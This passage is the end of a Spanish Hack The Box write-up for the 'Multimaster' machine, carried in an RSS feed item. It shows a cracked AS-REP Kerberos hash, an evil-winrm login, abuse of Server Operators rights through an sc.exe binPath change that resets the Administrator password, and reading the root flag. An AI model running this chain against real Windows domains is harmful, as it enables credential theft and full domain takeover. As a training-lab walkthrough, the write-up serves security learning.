-$krb5asrep$23$jorden@MEGACORP.LOCAL:8e7ea2a50a1602c925cf681fca176a58$a2a1627ed23fe85bdadc88c1a0b551f0ee10dfe43f7677fc6f1204e36d5e849c95932313e7fae6b9829be5d69f243279f32098db2118abef962bb1b7fa2caafe91ca22d2747690dea014ecc6e9f95e2dffdd8acac823f47c7e29a834cf910daa4cbdc19187bbf95d436e083a050e274fd15905b15f58c2e9cc23932efcac112a2adf3a59fd3de0342d4d35e33f7da5aeb2be18db5aa625a95adbde5c075843711be01945177e8fd7935c8edc5355ee98fce7b9d4becbc72e14606e5c4df3b1577f19b621457089150499cf8a79616110fe973d7e63bbde78641380be90733b621190a13c13968c6ed3d2d9ea85bf9603
-[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Procedamos a crackearlo con &lt;code&gt;john&lt;/code&gt; y nos devuelve la contraseña en texto claro.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
-Using default input encoding: UTF-8
-Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-rainforest786    ($krb5asrep$23$jorden@MEGACORP.LOCAL)
-1g 0:00:00:06 DONE (2023-04-02 17:01) 0.1550g/s 682666p/s 682666c/s 682666C/s rainian..railezs05
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
-Session completed
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nos conectamos nuevamente con &lt;code&gt;evil-winrm&lt;/code&gt; y hubieramos migrado al usuario &lt;code&gt;jorden&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;❯ evil-winrm -i 10.10.10.179 -u 'jorden' -p 'rainforest786'
-
-Evil-WinRM shell v3.4
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\jorden\Documents&amp;gt; whoami
-megacorp\jorden
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Antes vimos que este usuario formaba parte del grupo &lt;code&gt;Server Operators&lt;/code&gt;, aprovecharemos esto para cambiar la propiedad &lt;code&gt;binpath&lt;/code&gt; de un proceso el cual el forzaremos a desactivarse y al iniciarlo nuevamente nos ejecutara la sentencia que hayamos puesto.&lt;/p&gt;
-
-&lt;p&gt;Cambiaremos el &lt;code&gt;binPath&lt;/code&gt; del proceso &lt;code&gt;browser&lt;/code&gt; para que al volver a iniciarse nos cambie la contraseña del usuario &lt;code&gt;Administrator&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\Users\jorden\Documents&amp;gt; sc.exe config browser binPath=&quot;C:\Windows\System32\cmd.exe /c net user Administrator fmiracle123$!&quot;
-[SC] ChangeServiceConfig SUCCESS
-*Evil-WinRM* PS C:\Users\jorden\Documents&amp;gt; sc.exe stop browser
-
-SERVICE_NAME: browser
-        TYPE               : 20  WIN32_SHARE_PROCESS
-        STATE              : 3  STOP_PENDING
-                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
-        CHECKPOINT         : 0x1
-        WAIT_HINT          : 0xafc8
-*Evil-WinRM* PS C:\Users\jorden\Documents&amp;gt; sc.exe start browser
-[SC] StartService FAILED 1053:
-
-The service did not respond to the start or control request in a timely fashion.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Verificamos y efectivamente cambiamos las claves del usuario &lt;code&gt;Administrator&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.179 -u 'Administrator' -p 'fmiracle123$!'
-SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
-SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\Administrator:fmiracle123$! (Pwn3d!)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo siguiente sera conectarnos, ir al directorio personal del usuario y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;❯ evil-winrm -i 10.10.10.179 -u 'Administrator' -p 'fmiracle123$!'
-
-Evil-WinRM shell v3.4
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; cd ..\Desktop
-*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
-559ca9f9c145bc76f8504391a74710cc
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;y listo maquina pwneada!!&lt;/p&gt;
-
-</description>
-        <pubDate>Fri, 24 Mar 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/hackthebox/htb-writeup-Multimaster</link>
-        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Multimaster</guid>
-        
-        <category>SqlInjection</category>
-        
-        <category>WAF Bypass</category>
-        
-        <category>Advanced Python Scripting</category>
-        
-        <category>Active Directory</category>
-        
-        <category>Smb Bruteforce</category>
-        
-        <category>RPC Enum</category>
-        
-        <category>Nishang</category>
-        
-        <category>CEF Debugger</category>
-        
-        <category>Server Operators</category>
         
         
         <category>hackthebox</category>
